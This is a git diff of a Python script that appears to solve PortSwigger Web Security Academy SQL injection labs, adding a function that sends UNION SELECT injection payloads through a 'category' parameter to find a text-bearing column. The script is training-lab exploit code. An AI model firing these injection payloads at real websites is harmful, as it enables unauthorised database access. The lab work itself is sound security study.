@@ -1,12 +1,13 @@
 # https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns
+# https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text
 
 import requests
 requests.packages.urllib3.disable_warnings()
 
-url = "https://ac881fa91e8e17aa80f81103009e0065.web-security-academy.net/filter"
+url = "https://acf41f8c1e2e2754807f03fc00d70052.web-security-academy.net/filter"
 proxy = "127.0.0.1:8080"
 proxies = {"https": proxy, "http": proxy}
-cookies = {"session": "O5RYagmhoPZD7OezmA0QtQ8OigGlmBpm"}
+cookies = {"session": ""}
 verify = False
 
 def determineNumberOfColumnsLab():
@@ -34,4 +35,15 @@ def determineNumberOfColumnsLab():
     for k,_ in rs.items():
         print(k)
 
+def findColumnContainingTextLab():
+    cols = ["'btHbdU', NULL, NULL",
+            "NULL, 'btHbdU', NULL",
+            "NULL, NULL, 'btHbdU'"]
+
+    for c in cols:
+        q = f"' UNION SELECT {c}-- "
+        params = {"category": q}
+        requests.get(url, params=params, cookies=cookies, verify=verify, proxies=proxies)
+
 # determineNumberOfColumnsLab()
+findColumnContainingTextLab()
